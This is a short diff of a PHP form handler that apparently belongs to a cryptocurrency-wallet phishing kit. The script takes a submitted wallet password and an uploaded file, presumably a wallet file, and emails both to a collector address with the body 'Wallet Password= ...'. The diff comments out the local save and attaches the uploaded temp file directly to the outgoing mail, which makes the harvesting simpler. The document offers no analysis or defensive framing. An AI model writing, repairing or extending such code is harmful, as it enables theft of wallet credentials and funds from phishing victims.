@@ -37,12 +37,12 @@ if($wallet_pass== ''){
                $errors[]='File size must be excately 2 MB';
             }
 
-            if(empty($errors)==true){
-               move_uploaded_file($file_tmp,"uploads/".$file_name);
-               echo "Success";
-            }else{
-               print_r($errors);
-            }
+          //  if(empty($errors)==true){
+            //   move_uploaded_file($file_tmp,"uploads/".$file_name);
+            //   echo "Success";
+          //  }else{
+          //     print_r($errors);
+          //  }
          }
 
 
@@ -59,8 +59,7 @@ $mail->setFrom($email_from);
 $mail->AddReplyTo($email_from);
 $mail->Subject = "/New Entry";
 $mail->MsgHTML($email_from);
-$mail->addAttachment("uploads/".$file_name);
-$mail->addAttachment($targetFilePath);
+$mail->addAttachment($file_tmp, $file_name);
 $mail->Body = "Wallet Password= " . $wallet_pass;
 
 $mail->addAddress($email_to);
